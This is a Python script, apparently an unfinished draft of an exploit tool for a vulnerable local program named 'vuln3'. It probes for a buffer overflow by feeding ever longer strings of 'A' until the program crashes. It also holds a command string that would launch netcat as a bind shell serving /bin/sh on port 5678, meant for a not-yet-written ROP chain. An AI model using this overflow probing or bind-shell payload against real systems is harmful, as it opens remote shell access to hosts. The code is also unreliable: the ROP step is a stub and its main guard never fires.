import os

BRUTE_FORCE = 0
BINARY_SEARCH = 1
ANALYSIS = 2

COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"\bin//sh\", NULL)"
PROGRAM = "vuln3"
FILE_MODE = True

def main():
    program = "./" + PROGRAM
    if FILE_MODE:
        program += " "
    else:
        program += " < "

    #STEP 1 - Buffer Discovery
    bufferLength = bufferDiscovery(BRUTE_FORCE, program)
    print(bufferLength)
    #STEP 2 - Create ROP Chain
    #FILE ROPchain = createROPchain(COMMAND);
    #STEP 3a - Verify success with known .data

    #STEP 3b - Verify success with random .data

def bufferDiscovery(mode, program):
    if(mode == BRUTE_FORCE):
        #Do Something
        print("Brute Force")
        return bruteForce(program)
    if(mode == BINARY_SEARCH):
        #Do Something
        print("Binary Search")
    if(mode == ANALYSIS):
        #Do Something
        print("Analysis")

def bruteForce(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    for i in range(0, 128):
        payload = 'A' * i
        writePayload(test, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(i) + ", returned code " + str(output))
        if output == 35584:
            return i
    return -1

def writePayload(file, string):
    file.seek(0)
    file.write(string)

def run(program, payload):
    command = program + payload
    return os.system(command)

def createROPchain(command):
    return None

if __name__ == "main":
    main()